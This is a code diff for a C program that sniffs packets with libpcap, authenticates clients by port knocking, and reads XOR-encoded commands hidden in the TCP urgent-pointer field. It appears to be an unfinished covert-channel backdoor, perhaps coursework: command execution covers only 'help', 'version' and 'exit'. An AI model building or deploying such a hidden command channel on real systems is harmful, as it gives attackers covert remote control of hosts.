@@ -51,6 +51,12 @@ void* ReceiveDatagram (void *pcap_arg)
 	return NULL;
 }
 
+void startServer(void* Addr_Ptr, void* pcap_ptr, pthread_t *ThreadID2)
+{
+    pthread_create (ThreadID2, NULL, ReceiveDatagram, (void *)pcap_ptr);
+    pthread_join (*ThreadID2, NULL);
+}
+
 void setupSignals()
 {
     if (signal(SIGINT, endProgram) == SIG_ERR)
@@ -109,15 +115,17 @@ void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_c
 			if(ip_header->protocol == IPPROTO_TCP)
 			{
 				tcp_header = (struct tcphdr*)(packet + sizeof(struct ethhdr) + ip_header->ihl*4);
-				
-				if(authenticated(ip_header->saddr))
+				if (server == 0) // if you are the server
 				{
-					runCommand(decryptPacket(tcp_header));
-					//pthread_create() // make the thread for sending the results back
+					if(authenticated(ip_header->saddr))
+					{
+						runCommand(decryptPacket(tcp_header));
+					} else {
+						authenticateClient(ip_header, tcp_header);
+					}
 				} else {
-					authenticateClient(ip_header, tcp_header);
+					sendCommand();
 				}
-
 			}
 		}
 	}
@@ -127,31 +135,25 @@ void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_c
 char* decryptPacket(struct tcphdr* tcp_header)
 {
 	char temp[3] = {0};
-	sprintf(temp, "%d", tcp_header->urg);
+	char encodedLetter = 0;
+	sprintf(temp, "%c", tcp_header->urg_ptr);
 	strcat(command, temp);
+	
+	encodedLetter = command[length(command)-1];
 
-	if (temp[0] == 21)
+	if (encodedLetter == 21)
 	{
-		XOR();
+		XOR(command);
 		return command;
 	}
 
 	return "";
 }
 
-void XOR()
-{
-	size_t l = 0;
-	for(l = 0; l < strlen(command); l++)
-	{
-		command[l] = command[l] ^ XORVALUE;
-	}
-}
-
 void runCommand(char* command)
 {
 	if (strcmp(command, "") != 0)
-		printf("%s\n", command);
+		executeCommand(command);
 }
 
 int authenticated(int ip)
@@ -190,7 +192,6 @@ int authenticateClient(struct iphdr* ip_header, struct tcphdr* tcp_header)
 
 	for (j=0; j<=temp; j++)
 	{
-		//printf("i:%d j:%zu temp:%zu try:%d cor:%d\n", i, j, temp, tries[j], knockCode[j]);
 		if(tries[j] != knockCode[j])
 		{
 			fails++;
@@ -201,7 +202,6 @@ int authenticateClient(struct iphdr* ip_header, struct tcphdr* tcp_header)
 		{
 			printf("============ AUTH ============\n"); // change this later
 			auth[0] = ip_header->saddr;
-			//printf("%d\n", auth[0]);
 
 			for (j=0; j<=temp; j++)
 				tries[j]=0;
@@ -230,13 +230,22 @@ void* knockListener(void* pcap_arg)
     return NULL;
 }
 
-void executeCommand()
+void executeCommand(char* command)
 {
+	if (strcmp(command, "help") == 0) 
+	{
+		usage2();
+	} else if (strcmp(command, "version") == 0) {
+		printf("version 1\n");
+	} else if (strcmp(command, "exit") == 0) {
+		exit(1);
+	}
+
+	memset(command, 0, sizeof(command));
     //spawnThread();
 }
 
 static void endProgram (int signo)
 {
-    // stop the program
-    exit(1);
+	exit(1);
 }
